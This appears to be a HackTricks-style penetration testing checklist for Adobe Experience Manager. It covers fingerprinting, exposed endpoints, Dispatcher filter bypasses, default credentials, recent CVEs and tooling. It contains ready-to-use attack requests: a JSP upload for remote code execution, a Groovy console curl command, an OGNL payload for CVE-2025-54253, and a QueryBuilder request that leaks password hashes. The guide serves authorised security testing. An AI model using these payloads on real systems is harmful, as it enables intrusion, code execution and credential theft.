# AEM (Adobe Experience Manager) Pentesting

{{#include ../../banners/hacktricks-training.md}}

> Adobe Experience Manager (AEM, part of the Adobe Experience Cloud) is an enterprise CMS that runs on top of Apache Sling/Felix (OSGi) and a Java Content Repository (JCR).  
> From an attacker perspective AEM instances very often expose dangerous development endpoints, weak Dispatcher rules, default credentials and a long tail of CVEs that are patched every quarter.

The checklist below focuses on **externally reachable (unauth) attack surface** that keeps showing up in real engagements (2022-2026).

---

## 1. Fingerprinting

```
$ curl -s -I https://target | egrep -i "aem|sling|cq"
X-Content-Type-Options: nosniff
X-Dispatcher: hu1            # header added by AEM Dispatcher
X-Vary: Accept-Encoding
```

Other quick indicators:
* `/etc.clientlibs/` static path present (returns JS/CSS).  
* `/libs/granite/core/content/login.html` login page with the “Adobe Experience Manager” banner.  
* `</script><!--/* CQ */-->` comment at the bottom of HTML.

---

## 2. High-value unauthenticated endpoints

Path | What you get | Notes
---- | ------------- | -----
`/.json`, `/.1.json` | JCR nodes via **DefaultGetServlet** | Often blocked, but *Dispatcher bypass* (see below) works.
`/bin/querybuilder.json?path=/` | QueryBuilder API | Leak of page tree, internal paths, user names.
`/system/console/status-*`, `/system/console/bundles` | OSGi/Felix console | 403 by default; if exposed & creds found ⇒ bundle-upload RCE.
`/crx/packmgr/index.jsp` | Package Manager | Allows authenticated content packages → JSP payload upload.
`/etc/groovyconsole/**` | AEM Groovy Console | If exposed → arbitrary Groovy / Java execution.
`/libs/cq/AuditlogSearchServlet.json` | Audit logs | Information disclosure.
`/libs/cq/ui/content/dumplibs.html` | ClientLibs dump | XSS vector.
`/adminui/debug` | **AEM Forms on JEE** Struts dev-mode OGNL evaluator | On misconfigured Forms installs (CVE-2025-54253) this endpoint executes unauthenticated OGNL → RCE.

### Dispatcher bypass tricks (still working in 2025/2026)
Most production sites sit behind the *Dispatcher* (reverse-proxy). Filter rules are frequently bypassed by abusing encoded characters or allowed static extensions.

*Classic semicolon + allowed extension*
```
GET /bin/querybuilder.json;%0aa.css?path=/home&type=rep:User HTTP/1.1
```

*Encoded slash bypass (2025 KB ka-27832)*
```
GET /%2fbin%2fquerybuilder.json?path=/etc&1_property=jcr:primaryType HTTP/1.1
```
If the Dispatcher allows encoded slashes, this returns JSON even when `/bin` is supposedly denied.

---

## 3. Common misconfigurations (still alive in 2026)

1. **Anonymous POST servlet** – `POST /.json` with `:operation=import` lets you plant new JCR nodes. Blocking `*.json` POST in the Dispatcher fixes it.
2. **World-readable user profiles** – default ACL grants `jcr:read` on `/home/users/**/profile/*` to everyone.
3. **Default credentials** – `admin:admin`, `author:author`, `replication:replication`.
4. **WCMDebugFilter** enabled ⇒ reflected XSS via `?debug=layout` (CVE-2016-7882, still found on legacy 6.4 installs).
5. **Groovy Console exposed** – remote code execution by sending a Groovy script:
   ```bash
   curl -u admin:admin -d 'script=println "pwn".execute()' https://target/bin/groovyconsole/post.json
   ```
6. **Dispatcher encoded-slash gap** – `/bin/querybuilder.json` and `/etc/truststore.json` reachable with `%2f`/`%3B` even when blocked by path filters.
7. **AEM Forms Struts devMode left enabled** – `/adminui/debug?expression=` evaluates OGNL without auth (CVE-2025-54253) leading to unauth RCE; paired XXE in Forms submission (CVE-2025-54254) allows file read.

## 4. Recent vulnerabilities (service-pack cadence)

Quarter | CVE / Bulletin | Affected | Impact
------- | --- | -------- | ------
Dec 2025 | **APSB25-115**, CVE-2025-64537/64539 | 6.5.24 & earlier, Cloud 2025.12 | Multiple critical/stored XSS → code execution via author UI.
Sep 2025 | APSB25-90 | 6.5.23 & earlier | Security feature bypass chain (Dispatcher auth checker) – upgrade to 6.5.24/Cloud 2025.12.
Aug 2025 | **CVE-2025-54253 / 54254** (AEM Forms JEE) | Forms 6.5.23.0 and earlier | DevMode OGNL RCE + XXE file read, unauthenticated.
Jun 2025 | APSB25-48 | 6.5.23 & earlier | Stored XSS and privilege escalation in Communities components.
Dec 2024 | APSB24-69 (rev. Mar 2025 adds CVE-2024-53962…74) | 6.5.22 & earlier | DOM/Stored XSS, arbitrary code exec (low-priv).
Dec 2023 | APSB23-72 | ≤ 6.5.18 | DOM-based XSS via crafted URL.

Always check the *APSB* bulletin matching the customer’s service-pack and push for the latest **6.5.24 (Nov 26, 2025)** or **Cloud Service 2025.12**. AEM Forms on JEE requires its own add-on hotfix **6.5.0-0108+**.

## 5. Exploitation snippets

### 5.1 RCE via dispatcher bypass + JSP upload
If anonymous write is possible:
```
# 1. Create a node that will become /content/evil.jsp
POST /content/evil.jsp;%0aa.css HTTP/1.1
Content-Type: application/x-www-form-urlencoded

:contentType=text/plain
jcr:data=<% out.println("pwned"); %>
:operation=import
```
Now request `/content/evil.jsp` – the JSP runs with the AEM process user.

### 5.2 SSRF to RCE (historical < 6.3)
`/libs/mcm/salesforce/customer.html;%0aa.css?checkType=authorize&authorization_url=http://127.0.0.1:4502/system/console`  
`aem_ssrf2rce.py` from **aem-hacker** automates the full chain.

### 5.3 OGNL RCE on AEM Forms JEE (CVE-2025-54253)
```
# Unauth devMode OGNL to run whoami
curl -k "https://target:8443/adminui/debug?expression=%23cmd%3D%27whoami%27,%23p=new%20java.lang.ProcessBuilder(%23cmd).start(),%23out=new%20java.io.InputStreamReader(%23p.getInputStream()),%23br=new%20java.io.BufferedReader(%23out),%23br.readLine()"
```
If vulnerable, the HTTP body contains the command output.

### 5.4 QueryBuilder hash disclosure (encoded slash bypass)
```
GET /%2fbin%2fquerybuilder.json?path=/home&type=rep:User&p.hits=full&p.nodedepth=2&p.offset=0 HTTP/1.1
```
Returns user nodes including `rep:password` hashes when anonymous read ACLs are default.

## 6. Tooling

* **aem-hacker** – Swiss-army enumeration script, supports dispatcher bypass, SSRF detection, default-creds checks and more.  
  ```bash
  python3 aem_hacker.py -u https://target --host attacker-ip
  ```
* **Tenable WAS plugin 115065** – Detects QueryBuilder hash disclosure & encoded-slash bypass automatically (published Dec 2025).
* **Content brute-force** – recursively request `/_jcr_content.(json|html)` to discover hidden components.
* **osgi-infect** – upload malicious OSGi bundle via `/system/console/bundles` if creds available.
